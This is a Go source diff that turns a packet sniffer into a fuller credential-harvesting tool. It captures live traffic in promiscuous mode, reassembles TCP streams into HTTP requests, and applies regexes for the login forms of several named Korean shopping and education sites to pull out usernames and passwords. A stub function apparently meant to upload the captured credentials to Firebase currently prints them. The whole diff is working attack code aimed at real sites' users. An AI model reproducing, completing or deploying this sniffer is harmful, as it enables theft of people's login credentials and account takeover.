@@ -1,14 +1,20 @@
 package main
 
 import (
-	"bytes"
+	"bufio"
 	"fmt"
+	"io"
+	"io/ioutil"
 	"log"
+	"net/http"
 	"regexp"
+	"time"
 
 	"github.com/google/gopacket"
 	"github.com/google/gopacket/layers"
 	"github.com/google/gopacket/pcap"
+	"github.com/google/gopacket/tcpassembly"
+	"github.com/google/gopacket/tcpassembly/tcpreader"
 )
 
 var (
@@ -19,12 +25,57 @@ var (
 		"http://www.giordano.co.kr/":  regexp.MustCompile(`Data%5Bid%5D=(.+)&Data%5Bpw%5D=(.+)`),
 		"http://www.nike.co.kr/":      regexp.MustCompile(`&loginId=(.+)&password=(.+)`),
 		"http://www.junggo.com/":      regexp.MustCompile(`&mb_id=(.+)&mb_password=(.+)`),
-		"http://m.bunjang.co.kr/":     regexp.MustCompile(`userid=(.+)&userpw=(.+)`),
+		"http://m.bunjang.co.kr/":     regexp.MustCompile(`userid=(.+)&userpw=(.+)&`),
 		"http://www.coocha.co.kr/":    regexp.MustCompile(`mid=(.+)&mpwd=(.+)`),
 		"http://www.daisomall.co.kr/": regexp.MustCompile(`&id=(.+)&pw=(.+)`),
 		"http://www.ebsi.co.kr/":      regexp.MustCompile(`username=(.+)&j_password=(.+)`),
 	}
 )
+
+// httpStreamFactory implements tcpassembly.StreamFactory
+type httpStreamFactory struct{}
+
+func (h *httpStreamFactory) New(_, _ gopacket.Flow) tcpassembly.Stream {
+	r := tcpreader.NewReaderStream()
+	go printRequests(&r)
+	return &r
+}
+
+func printRequests(r *tcpreader.ReaderStream) {
+	buf := bufio.NewReader(r)
+	for {
+		if req, err := http.ReadRequest(buf); err == io.EOF {
+			return
+		} else if err != nil {
+			// log.Println("Error parsing HTTP requests:", err)
+		} else {
+			body, err := ioutil.ReadAll(req.Body)
+			defer req.Body.Close()
+			if err != nil {
+				continue
+			}
+			if parsed := find(body); len(parsed) > 0 {
+				writeToFirebase(parsed)
+			}
+		}
+	}
+}
+
+func find(http []byte) []string {
+	for url, re := range reMap {
+		parsed := re.FindSubmatch(http)
+		if len(parsed) != 3 {
+			continue
+		}
+		return []string{url, string(parsed[1]), string(parsed[2])}
+	}
+	return nil
+}
+
+func writeToFirebase(row []string) {
+	// working...
+	fmt.Println(row)
+}
 
 func parse(device pcap.Interface) {
 	handle, err := pcap.OpenLive(device.Name, snapshotLen, promiscuous, timeout)
@@ -33,22 +84,43 @@ func parse(device pcap.Interface) {
 	}
 	defer handle.Close()
 
-	packetSource := gopacket.NewPacketSource(handle, handle.LinkType())
-	for packet := range packetSource.Packets() {
-		tcpLayer := packet.Layer(layers.LayerTypeTCP)
-		if tcpLayer != nil {
-			tcpPacket := tcpLayer.(*layers.TCP)
-			http := tcpPacket.Payload
+	streamFactory := &httpStreamFactory{}
+	streamPool := tcpassembly.NewStreamPool(streamFactory)
+	assembler := tcpassembly.NewAssembler(streamPool)
 
-			if len(http) > 5 && (bytes.Equal(http[:4], []byte("GET ")) || bytes.Equal(http[:5], []byte("POST "))) {
-				for url, re := range reMap {
-					parsed := re.FindSubmatch(http)
-					if len(parsed) != 3 {
-						continue
-					}
-					fmt.Println(url, ":", string(parsed[1]), string(parsed[2]))
-				}
+	packetSource := gopacket.NewPacketSource(handle, handle.LinkType())
+	packets := packetSource.Packets()
+	ticker := time.Tick(time.Minute)
+	for {
+		select {
+		case packet := <-packets:
+			if packet.NetworkLayer() == nil || packet.TransportLayer() == nil || packet.TransportLayer().LayerType() != layers.LayerTypeTCP {
+				continue
 			}
+			tcp := packet.TransportLayer().(*layers.TCP)
+			assembler.AssembleWithTimestamp(packet.NetworkLayer().NetworkFlow(), tcp, packet.Metadata().Timestamp)
+
+		case <-ticker:
+			// Every minute, flush connections that haven't seen activity in the past 2 minutes.
+			assembler.FlushOlderThan(time.Now().Add(time.Minute * -2))
 		}
 	}
+
+	// for packet := range packetSource.Packets() {
+	// 	tcpLayer := packet.Layer(layers.LayerTypeTCP)
+	// 	if tcpLayer != nil {
+	// 		tcpPacket := tcpLayer.(*layers.TCP)
+	// 		http := tcpPacket.Payload
+
+	// 		if len(http) > 5 && (bytes.Equal(http[:4], []byte("GET ")) || bytes.Equal(http[:5], []byte("POST "))) {
+	// 			for url, re := range reMap {
+	// 				parsed := re.FindSubmatch(http)
+	// 				if len(parsed) != 3 {
+	// 					continue
+	// 				}
+	// 				fmt.Println(url, ":", string(parsed[1]), string(parsed[2]))
+	// 			}
+	// 		}
+	// 	}
+	// }
 }
